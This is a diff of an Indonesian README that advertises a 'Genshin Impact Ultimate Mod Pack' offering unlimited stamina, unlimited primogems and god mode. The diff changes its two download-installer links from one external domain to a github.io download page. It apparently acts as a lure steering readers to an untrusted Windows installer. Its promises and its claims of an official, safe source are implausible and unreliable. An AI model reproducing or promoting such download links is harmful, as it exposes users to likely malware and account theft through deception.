@@ -2,7 +2,7 @@
 
 Selamat datang di repository Genshin Impact Ultimate Mod Pack untuk tahun 2026. Paket ini merupakan solusi lengkap bagi para pemain Windows yang ingin memaksimalkan pengalaman bermain Genshin Impact melalui berbagai modifikasi canggih. Dengan fitur-fitur unggulan seperti stamina tak terbatas, primogems unlimited, dan mode dewa, alat ini dirancang untuk memberikan kebebasan dan kemudahan dalam menjelajahi dunia Teyvat tanpa batasan.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://mostway.xyz/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://missives-2704-billeted.github.io/download-page/)
 
 ## Fitur Utama
 Mod pack ini menawarkan sejumlah fitur yang meningkatkan aspek gameplay secara signifikan. Berikut adalah beberapa fitur inti yang tersedia:
@@ -57,7 +57,7 @@ A: Tentu saja. Anda dapat menghapus alat melalui "Tambah atau Hapus Program" di 
 ## Unduhan
 Untuk mendapatkan versi terbaru dari Genshin Impact Ultimate Mod Pack, kunjungi halaman unduhan resmi:
 
-[Download versi terbaru dari GitHub](https://mostway.xyz/)
+[Download versi terbaru dari GitHub](https://missives-2704-billeted.github.io/download-page/)
 
 Pastikan Anda selalu mengunduh dari sumber resmi untuk menghindari file yang dimodifikasi atau berbahaya. Halaman ini menyediakan installer terbaru dan catatan rilis untuk setiap pembaruan.
 
